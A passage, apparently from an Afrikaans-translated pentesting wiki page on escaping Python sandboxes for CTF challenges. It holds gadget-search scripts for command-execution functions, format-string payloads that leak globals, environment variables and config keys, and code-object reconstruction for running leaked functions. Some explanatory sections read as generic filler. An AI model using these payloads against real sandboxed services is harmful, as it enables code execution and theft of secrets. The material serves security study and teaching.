importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pdb:
"""
```
Verder, as jy dink **ander biblioteke** moontlik in staat is om **funksies te roep om opdragte uit te voer**, kan ons ook **filtreer volgens funksienames** binne die moontlike biblioteke:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
for b in bad_libraries_names + bad_func_names:
vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
print(f"{b}: {', '.join(vuln_funcs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pip:
pdb:
system: _wrap_close, _wrap_close
getstatusoutput: CompletedProcess, Popen
getoutput: CompletedProcess, Popen
call: CompletedProcess, Popen
Popen: CompletedProcess, Popen
spawn:
import_module:
__import__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec
load_source: NullImporter, _HackedGetData
execfile:
execute:
__builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
"""
```
## Herhalende Soektog na Ingeboude Funksies, Globale...

{% hint style="warning" %}
Dit is net **fantasties**. As jy **op soek is na 'n objek soos globals, builtins, open of enige iets**, gebruik hierdie skripsie om **herhalend plekke te vind waar jy daardie objek kan vind**.
{% endhint %}
```python
import os, sys # Import these to find more gadgets

SEARCH_FOR = {
# Misc
"__globals__": set(),
"builtins": set(),
"__builtins__": set(),
"open": set(),

# RCE libs
"os": set(),
"subprocess": set(),
"commands": set(),
"pty": set(),
"importlib": set(),
"imp": set(),
"sys": set(),
"pip": set(),
"pdb": set(),

# RCE methods
"system": set(),
"popen": set(),
"getstatusoutput": set(),
"getoutput": set(),
"call": set(),
"Popen": set(),
"popen": set(),
"spawn": set(),
"import_module": set(),
"__import__": set(),
"load_source": set(),
"execfile": set(),
"execute": set()
}

#More than 4 is very time consuming
MAX_CONT = 4

#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be found
#ALREADY_CHECKED = set()

def check_recursive(element, cont, name, orig_n, orig_i, execute):
# If bigger than maximum, stop
if cont > MAX_CONT:
return

# If already checked, stop
#if name and name in ALREADY_CHECKED:
#    return

# Add to already checked
#if name:
#    ALREADY_CHECKED.add(name)

# If found add to the dict
for k in SEARCH_FOR:
if k in dir(element) or (type(element) is dict and k in element):
SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")

# Continue with the recursivity
for new_element in dir(element):
try:
check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)

# WARNING: Calling random functions sometimes kills the script
# Comment this part if you notice that behaviour!!
if execute:
try:
if callable(getattr(element, new_element)):
check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
except:
pass

except:
pass

# If in a dict, scan also each key, very important
if type(element) is dict:
for new_element in element:
check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)


def main():
print("Checking from empty string...")
total = [""]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Empty str {i}", True)

print()
print("Checking loaded subclasses...")
total = "".__class__.__base__.__subclasses__()
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Subclass {i}", True)

print()
print("Checking from global functions...")
total = [print, check_recursive]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Global func {i}", False)

print()
print(SEARCH_FOR)


if __name__ == "__main__":
main()
```
Jy kan die uitset van hierdie skripsie op hierdie bladsy kontroleer:

{% content-ref url="broken-reference" %}
[Gebroke skakel](broken-reference)
{% endcontent-ref %}

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Vind kwesbaarhede wat die belangrikste is sodat jy hulle vinniger kan regmaak. Intruder volg jou aanvalsoppervlak, voer proaktiewe dreigingsskanderings uit, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag nog gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Python Formaat String

As jy 'n **string** na Python **stuur** wat **geformateer** gaan word, kan jy `{}` gebruik om toegang te verkry tot **Python interne inligting**. Jy kan die vorige voorbeelde gebruik om byvoorbeeld globale of ingeboude funksies te benader.

{% hint style="info" %}
Daar is egter 'n **beperking**, jy kan slegs die simbole `.[]` gebruik, so jy sal **nie in staat wees om willekeurige kode uit te voer nie**, net om inligting te lees.\
_**As jy weet hoe om kode uit te voer deur hierdie kwesbaarheid, kontak my asseblief.**_
{% endhint %}
```python
# Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
CONFIG = {
"KEY": "ASXFYFGK78989"
}

class PeopleInfo:
def __init__(self, fname, lname):
self.fname = fname
self.lname = lname

def get_name_for_avatar(avatar_str, people_obj):
return avatar_str.format(people_obj = people_obj)

people = PeopleInfo('GEEKS', 'FORGEEKS')

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
get_name_for_avatar(st, people_obj = people)
```
Let daarop hoe jy **toegang kan verkry tot eienskappe** op 'n normale manier met 'n **punt** soos `people_obj.__init__` en **woordeboek element** met **hakies** sonder aanhalingstekens `__globals__[CONFIG]`

Let ook daarop dat jy `.__dict__` kan gebruik om elemente van 'n objek op te som `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`

Sommige ander interessante kenmerke van formaatstrings is die moontlikheid om die **funksies** **`str`**, **`repr`** en **`ascii`** uit te voer in die aangeduide objek deur **`!s`**, **`!r`**, **`!a`** onderskeidelik by te voeg:
```python
st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
get_name_for_avatar(st, people_obj = people)
```
Verder is dit moontlik om **nuwe formatters te kodeer** in klasse:
```python
class HAL9000(object):
def __format__(self, format):
if (format == 'open-the-pod-bay-doors'):
return "I'm afraid I can't do that."
return 'HAL 9000'

'{:open-the-pod-bay-doors}'.format(HAL9000())
#I'm afraid I can't do that.
```
**Meer voorbeelde** oor **formaat** **string** voorbeelde kan gevind word by [**https://pyformat.info/**](https://pyformat.info)

{% hint style="danger" %}
Kyk ook na die volgende bladsy vir gadgets wat **sensitiewe inligting van Python interne voorwerpe** sal **lees**:
{% endhint %}

{% content-ref url="../python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
{% endcontent-ref %}

### Payloads vir die Openbaarmaking van Sensitiewe Inligting
```python
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
```
## Ontleding van Python-voorwerpe

{% hint style="info" %}
As jy diep wil **leer** oor **python bytekode**, lees hierdie **fantastiese** pos oor die onderwerp: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
{% endhint %}

In sommige CTFs kan jy die naam van 'n **aangepaste funksie waar die vlag** is, gekry het en jy moet die **interne werking** van die **funksie** sien om dit te onttrek.

Dit is die funksie om te ondersoek:
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
if some_input == var2:
return "THIS-IS-THE-FALG!"
else:
return "Nope"
```
#### lys

Hierdie metode word gebruik om 'n lys van alle beskikbare funksies en eienskappe van 'n spesifieke objek te kry. Dit kan handig wees om te sien watter funksies en eienskappe beskikbaar is vir 'n spesifieke module of klasse. Die sintaksis vir die gebruik van die `dir`-funksie is as volg:

```python
dir(objek)
```

Hier is 'n voorbeeld van hoe om die `dir`-funksie te gebruik:

```python
import math

print(dir(math))
```

Hierdie sal 'n lys van alle funksies en eienskappe van die `math`-module druk.
```python
dir() #General dir() to find what we have loaded
['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
dir(get_flag) #Get info tof the function
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
```
#### globals

`__globals__` en `func_globals` (Dieselfde) verkry die globale omgewing. In die voorbeeld kan jy sien dat sommige ingevoerde modules, sommige globale veranderlikes en hul inhoud verklaar is:
```python
get_flag.func_globals
get_flag.__globals__
{'b': 3, 'names': ('open', 'read'), '__builtins__': <module '__builtin__' (built-in)>, 'codeobj': <code object <module> at 0x7f58c00b26b0, file "noname", line 1>, 'get_flag': <function get_flag at 0x7f58c00b27d0>, 'filename': './poc.py', '__package__': None, 'read': <function read at 0x7f58c00b23d0>, 'code': <type 'code'>, 'bytecode': 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S', 'consts': (None, './poc.py', 'r'), 'x': <unbound method catch_warnings.__init__>, '__name__': '__main__', 'foo': <function foo at 0x7f58c020eb50>, '__doc__': None, 'dis': <module 'dis' from '/usr/lib/python2.7/dis.pyc'>}

#If you have access to some variable value
CustomClassObject.__class__.__init__.__globals__
```
[**Sien hier meer plekke om globale waardes te verkry**](./#globals-and-locals)

### **Toegang tot die funksie kode**

**`__code__`** en `func_code`: Jy kan hierdie **eienskap** van die funksie **toegang** om die kode objek van die funksie te **verkry**.
```python
# In our current example
get_flag.__code__
<code object get_flag at 0x7f9ca0133270, file "<stdin>", line 1

# Compiling some python code
compile("print(5)", "", "single")
<code object <module> at 0x7f9ca01330c0, file "", line 1>

#Get the attributes of the code object
dir(get_flag.__code__)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
```
### Kry Kode-inligting

Om 'n Python-sandbox te omseil, is dit belangrik om toegang te verkry tot inligting oor die kode wat binne die sandbox uitgevoer word. Hier is 'n paar metodes om hierdie inligting te bekom:

#### 1. Gebruik van `inspect`-module

Die `inspect`-module in Python bied 'n verskeidenheid funksies wat gebruik kan word om inligting oor 'n spesifieke kode-objek te bekom. Hier is 'n paar nuttige funksies:

- `inspect.getsource()` - Gee die bronkode van 'n spesifieke funksie, klas of module.
- `inspect.getfile()` - Gee die lêernaam van 'n spesifieke funksie, klas of module.
- `inspect.getmodule()` - Gee die module-objek van 'n spesifieke funksie, klas of module.
- `inspect.getmembers()` - Gee 'n lys van alle lede van 'n spesifieke objek.

Hier is 'n voorbeeld van hoe om die `inspect`-module te gebruik:

```python
import inspect

def my_function():
    print("Hello, world!")

source_code = inspect.getsource(my_function)
file_name = inspect.getfile(my_function)
module = inspect.getmodule(my_function)
members = inspect.getmembers(my_function)

print("Source code:", source_code)
print("File name:", file_name)
print("Module:", module)
print("Members:", members)
```

#### 2. Gebruik van `dis`-module

Die `dis`-module in Python bied funksies wat gebruik kan word om die disassembled kode van 'n spesifieke funksie te bekom. Hier is 'n paar nuttige funksies:

- `dis.dis()` - Gee die disassembled kode van 'n spesifieke funksie.
- `dis.get_instructions()` - Gee 'n generator van instruksies vir 'n spesifieke funksie.

Hier is 'n voorbeeld van hoe om die `dis`-module te gebruik:

```python
import dis

def my_function():
    print("Hello, world!")

disassembled_code = dis.dis(my_function)
instructions = dis.get_instructions(my_function)

print("Disassembled code:", disassembled_code)
print("Instructions:", instructions)
```

#### 3. Gebruik van `inspect.signature()`

Die `inspect.signature()`-funksie kan gebruik word om die handtekening van 'n spesifieke funksie te bekom. Die handtekening bevat inligting oor die funksie se parameters en terugkeerwaarde.

Hier is 'n voorbeeld van hoe om `inspect.signature()` te gebruik:

```python
import inspect

def my_function(name: str, age: int) -> str:
    return f"My name is {name} and I am {age} years old."

signature = inspect.signature(my_function)

print("Signature:", signature)
```

Deur hierdie metodes te gebruik, kan jy toegang verkry tot inligting oor die kode wat binne 'n Python-sandbox uitgevoer word. Hierdie inligting kan jou help om die sandbox te omseil en toegang te verkry tot beperkte hulpbronne of funksies.
```python
# Another example
s = '''
a = 5
b = 'text'
def f(x):
return x
f(5)
'''
c=compile(s, "", "exec")

# __doc__: Get the description of the function, if any
print.__doc__

# co_consts: Constants
get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')

c.co_consts #Remember that the exec mode in compile() generates a bytecode that finally returns None.
(5, 'text', <code object f at 0x7f9ca0133540, file "", line 4>, 'f', None

# co_names: Names used by the bytecode which can be global variables, functions, and classes or also attributes loaded from objects.
get_flag.__code__.co_names
()

c.co_names
('a', 'b', 'f')


#co_varnames: Local names used by the bytecode (arguments first, then the local variables)
get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')

#co_cellvars: Nonlocal variables These are the local variables of a function accessed by its inner functions.
get_flag.__code__.co_cellvars
()

#co_freevars: Free variables are the local variables of an outer function which are accessed by its inner function.
get_flag.__code__.co_freevars
()

#Get bytecode
get_flag.__code__.co_code
'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
```
### **Ontleding van 'n funksie**

Om 'n funksie te ontleding, kan jy die volgende stappe volg:

1. Gebruik 'n disassembleringsinstrument om die masjienkode van die funksie te ontleed.
2. Analiseer die ontleedde masjienkode om die funksie se werking en logika te verstaan.
3. Identifiseer en ontleed die verskillende instruksies en operasies wat deur die funksie uitgevoer word.
4. Identifiseer en ontleed die funksie se argumente en terugkeerwaardes.
5. Identifiseer en ontleed enige beveiligingsmaatreëls of sandbokse wat in die funksie geïmplementeer is.
6. Identifiseer en ontleed enige potensiële swakhede of kwesbaarhede in die funksie wat misbruik kan word.

Deur 'n funksie te ontleding, kan jy 'n beter begrip kry van hoe dit werk en moontlike maniere identifiseer om dit te omseil of te misbruik.
```python
import dis
dis.dis(get_flag)
2           0 LOAD_CONST               1 (1)
3 STORE_FAST               1 (var1)

3           6 LOAD_CONST               2 ('secretcode')
9 STORE_FAST               2 (var2)

4          12 LOAD_CONST               3 ('some')
15 LOAD_CONST               4 ('array')
18 BUILD_LIST               2
21 STORE_FAST               3 (var3)

5          24 LOAD_FAST                0 (some_input)
27 LOAD_FAST                2 (var2)
30 COMPARE_OP               2 (==)
33 POP_JUMP_IF_FALSE       40

6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
39 RETURN_VALUE

8     >>   40 LOAD_CONST               6 ('Nope')
43 RETURN_VALUE
44 LOAD_CONST               0 (None)
47 RETURN_VALUE
```
Let daarop dat as jy nie `dis` kan invoer in die Python-sandbox nie, kan jy die **bytecode** van die funksie (`get_flag.func_code.co_code`) verkry en dit plaaslik **ontleder**. Jy sal nie die inhoud van die gelaaide veranderlikes (`LOAD_CONST`) sien nie, maar jy kan dit raai vanaf (`get_flag.func_code.co_consts`) omdat `LOAD_CONST` ook die verskuiwing van die gelaaide veranderlike aandui.
```python
dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
0 LOAD_CONST          1 (1)
3 STORE_FAST          1 (1)
6 LOAD_CONST          2 (2)
9 STORE_FAST          2 (2)
12 LOAD_CONST          3 (3)
15 LOAD_CONST          4 (4)
18 BUILD_LIST          2
21 STORE_FAST          3 (3)
24 LOAD_FAST           0 (0)
27 LOAD_FAST           2 (2)
30 COMPARE_OP          2 (==)
33 POP_JUMP_IF_FALSE    40
36 LOAD_CONST          5 (5)
39 RETURN_VALUE
>>   40 LOAD_CONST          6 (6)
43 RETURN_VALUE
44 LOAD_CONST          0 (0)
47 RETURN_VALUE
```
## Kompilering van Python

Nou, stel ons voor dat jy op een of ander manier die inligting van 'n funksie kan **dump** wat jy nie kan uitvoer nie, maar jy **moet** dit **uitvoer**.\
Soos in die volgende voorbeeld, **kan jy toegang kry tot die kode-object** van daardie funksie, maar deur net die disassemble te lees, **weet jy nie hoe om die vlag te bereken** (_stel jou 'n meer komplekse `calc_flag`-funksie voor_).
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
def calc_flag(flag_rot2):
return ''.join(chr(ord(c)-2) for c in flag_rot2)
if some_input == var2:
return calc_flag("VjkuKuVjgHnci")
else:
return "Nope"
```
### Skep die kode-objek

Eerstens moet ons weet **hoe om 'n kode-objek te skep en uit te voer** sodat ons een kan skep om ons uitgelekte funksie uit te voer:
```python
code_type = type((lambda: None).__code__)
# Check the following hint if you get an error in calling this
code_obj = code_type(co_argcount, co_kwonlyargcount,
co_nlocals, co_stacksize, co_flags,
co_code, co_consts, co_names,
co_varnames, co_filename, co_name,
co_firstlineno, co_lnotab, freevars=None,
cellvars=None)

# Execution
eval(code_obj) #Execute as a whole script

# If you have the code of a function, execute it
mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
```
{% hint style="info" %}
Afhanklik van die python-weergawe kan die **parameters** van `code_type` 'n **verskillende volgorde** hê. Die beste manier om die volgorde van die params in die python-weergawe wat jy gebruik, te weet, is om die volgende uit te voer:
```
import types
types.CodeType.__doc__
'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
```
{% endhint %}

### Herskepping van 'n uitgelekde funksie

{% hint style="warning" %}
In die volgende voorbeeld gaan ons al die data neem wat nodig is om die funksie te herskep vanaf die funksie kode objek direk. In 'n **werklike voorbeeld**, is al die **waardes** om die funksie uit te voer **`code_type`** wat **jy sal moet uitlek**.
{% endhint %}
```python
fc = get_flag.__code__
# In a real situation the values like fc.co_argcount are the ones you need to leak
code_obj = code_type(fc.co_argcount, fc.co_kwonlyargcount, fc.co_nlocals, fc.co_stacksize, fc.co_flags, fc.co_code, fc.co_consts, fc.co_names, fc.co_varnames, fc.co_filename, fc.co_name, fc.co_firstlineno, fc.co_lnotab, cellvars=fc.co_cellvars, freevars=fc.co_freevars)

mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
#ThisIsTheFlag
```
### Om Verdedigings te omseil

In vorige voorbeelde aan die begin van hierdie pos, kan jy sien **hoe om enige python-kode uit te voer deur die `compile`-funksie te gebruik**. Dit is interessant omdat jy **hele skripte kan uitvoer** met lusse en alles in 'n **eenreëler** (en ons kan dieselfde doen met behulp van **`exec`**).\
In elk geval kan dit soms nuttig wees om 'n **gekompileerde voorwerp** op 'n plaaslike masjien te skep en dit op die **CTF-masjien** uit te voer (byvoorbeeld omdat ons nie die `compiled`-funksie in die CTF het nie).

Byvoorbeeld, laat ons 'n funksie handmatig kompileer en uitvoer wat _./poc.py_ lees:
```python
#Locally
def read():
return open("./poc.py",'r').read()

read.__code__.co_code
't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
```

```python
#On Remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) #Get <type 'type'>
consts = (None, "./poc.py", 'r')
bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))

#You could also execute it directly
mydict = {}
mydict['__builtins__'] = __builtins__
